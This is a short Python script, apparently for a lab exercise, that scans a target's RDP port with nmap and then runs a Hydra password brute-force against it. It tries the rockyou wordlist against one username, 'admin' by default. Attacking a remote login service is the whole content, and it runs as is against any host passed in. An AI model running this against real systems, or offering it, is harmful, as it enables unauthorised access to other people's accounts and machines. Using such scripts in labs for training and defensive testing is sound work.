#!/usr/bin/env python3

import argparse
import shutil
import subprocess
import sys
import time


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run an RDP reconnaissance + Hydra brute-force lab workflow."
    )
    parser.add_argument("--target", default="rdp_target", help="RDP target hostname/IP")
    parser.add_argument("--port", type=int, default=3389, help="RDP target port")
    parser.add_argument("--username", default="admin", help="Username to brute-force")
    parser.add_argument(
        "--wordlist",
        default="/usr/share/wordlists/rockyou.txt",
        help="Path to password wordlist",
    )
    parser.add_argument(
        "--startup-wait",
        type=int,
        default=10,
        help="Seconds to wait before probing target",
    )
    return parser.parse_args()


def require_tool(tool_name: str) -> None:
    if shutil.which(tool_name) is None:
        print(f"[-] Required tool not found in PATH: {tool_name}")
        sys.exit(1)


def run_command(command: list[str], step_name: str) -> None:
    print(f"[*] {step_name}")
    result = subprocess.run(command, check=False)
    if result.returncode != 0:
        print(f"[-] {step_name} failed with exit code {result.returncode}")
        sys.exit(result.returncode)


def main() -> None:
    args = parse_args()
    print("[*] Checking RDP target status...")
    time.sleep(max(0, args.startup_wait))

    require_tool("nmap")
    require_tool("hydra")

    run_command(
        ["nmap", "-p", str(args.port), "-sV", args.target],
        f"Testing RDP service on {args.target}:{args.port}",
    )
    run_command(
        [
            "hydra",
            "-l",
            args.username,
            "-P",
            args.wordlist,
            "-s",
            str(args.port),
            f"rdp://{args.target}",
        ],
        "Attempting RDP brute-force",
    )
    print("[+] Workflow finished")


if __name__ == "__main__":
    main()